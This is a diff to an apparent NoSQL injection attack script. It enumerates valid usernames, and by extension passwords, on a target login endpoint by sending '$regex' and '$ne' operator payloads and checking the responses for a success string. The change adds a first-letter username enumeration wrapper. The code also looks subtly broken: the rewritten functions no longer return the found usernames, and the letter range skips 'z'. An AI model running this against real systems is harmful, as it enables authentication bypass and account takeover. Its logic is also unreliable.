@@ -76,7 +76,7 @@ def choice_username():
     clear_terminal()
     log("Getting username...")
     log(f"Target: '{url}'", 3)
-    username = get_username()
+    username = get_username_wrapper()
     if not username:
         username = 'admin'
     await_input()
@@ -207,11 +207,9 @@ def authenticate():
         await_input()
         main()
 
-def get_username():
-    username = ""
+def get_username(username):
     alphabet = list(map(chr, range(97, 122)))
-
-    while True:
+    while True: 
         for c in alphabet:
             params = {
                 user_param + "[$regex]":"^"+username+c+".*",
@@ -231,10 +229,33 @@ def get_username():
             if c == alphabet[-1]:
                 if len(username):
                     log(f"User found: '{username}'")
-                    return username
+                    return
                 else:
                     not_vulnerable()
                     return
+
+## gets number of usernames along with first character
+def get_username_wrapper():
+    usernames = []
+    alphabet = list(map(chr, range(97, 122)))
+    for c in alphabet:
+        params = {
+            user_param + "[$regex]":"^"+c+".*",
+            password_param + "[$ne]":'xXbOgUsXx'
+        }
+        response = send_sessionless_post(params)
+        if not response:
+            not_vulnerable()
+            return
+        if is_successfull(success_string,response):
+            usernames.append(c)
+            log(f"Found a username starting with {c}")
+        if c == alphabet[-1] and len(usernames)==0:
+            not_vulnerable()
+            return
+    log(f"Discovered {len(usernames)} valid usernames")
+    for username in usernames:
+        get_username(username)
 
 def get_password(username, pw_length):
     password = ""
@@ -299,3 +320,4 @@ if __name__ == "__main__":
     else:
         url = sys.argv[1]
         main()
+                
